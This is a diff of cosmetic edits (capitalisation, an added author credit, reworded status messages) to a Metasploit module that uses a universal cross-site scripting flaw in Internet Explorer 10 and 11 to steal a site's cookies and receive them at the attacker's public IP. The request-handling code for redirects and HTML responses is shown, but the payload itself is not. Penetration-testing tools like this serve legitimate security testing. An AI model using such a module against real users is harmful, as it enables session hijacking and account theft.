@@ -11,19 +11,20 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => "Microsoft Internet Explorer 10 and 11 Cross-domain Cookie Stealing",
+      'Name'           => "Microsoft Internet Explorer 10 and 11 Cross-Domain Cookie Stealing",
       'Description'    => %q{
-          This module exploits a universal cross-site scripting vulnerability found in Internet
+          This module exploits a universal cross-site scripting (UXSS) vulnerability found in Internet
           Explorer 10 and 11. It will steal the cookie of a specific webiste (set by the TARGET_URI
           datastore option). You will also most likely need to configure the MY_PUBLIC_IP
           datastore option in order receive the cookie. If you and the victim are actually in the
-          same network, then you don't need to touch MY_PUBLIC_IP.
+          same internal network, then you don't need to touch MY_PUBLIC_IP.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
-          'David Leo', # Original discovery
-          'sinn3r'     # MSF
+          'David Leo',      # Original discovery
+          'filedescriptor', # PoC
+          'sinn3r'          # MSF
         ],
       'References'     =>
         [
@@ -121,7 +122,7 @@ class Metasploit3 < Msf::Auxiliary
   def on_request_uri(cli, request)
     case request.uri
     when /redirect\.php/
-      print_status("sending redirect")
+      print_status("Sending redirect")
       send_redirect(cli, "#{datastore['TARGET_URI']}")
     when /sleep\.php/
       sleep(3)
@@ -140,7 +141,7 @@ class Metasploit3 < Msf::Auxiliary
         )
       end
     else
-      print_status("sending html")
+      print_status("Sending HTML")
       send_response(cli, get_html)
     end
   end
